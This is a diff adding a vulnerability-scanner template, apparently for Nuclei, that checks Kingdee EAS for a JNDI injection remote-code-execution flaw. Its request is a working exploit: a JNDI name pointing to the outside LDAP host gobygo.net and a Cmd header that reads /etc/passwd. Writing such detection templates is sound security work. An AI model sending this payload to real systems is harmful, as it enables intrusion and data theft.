@@ -1,0 +1,38 @@
+id: kingdee-eas-createdatasource-jndi-rce
+info:
+  name: 金蝶 EAS createdatasource jndi 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template checks for Remote Code Execution vulnerability in the 金蝶 EAS 'createDataSource' endpoint by injecting a payload and analyzing the response for indications of command execution.
+
+variables:
+  t1: "{{rand_base(4)}}"
+
+http:
+  - method: POST
+    path:
+      - "/appmonitor//protect/datasource/createDataSource"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cmd: cat /etc/passwd
+      Referer: https://{{Hostname}}
+    body: |
+      name={{t1}}&jndiName=ldap://gobygo.net/A7&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=asdasxasx&userName=asdasxasx&password=asdasxasx&repassword=asdasxasx&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
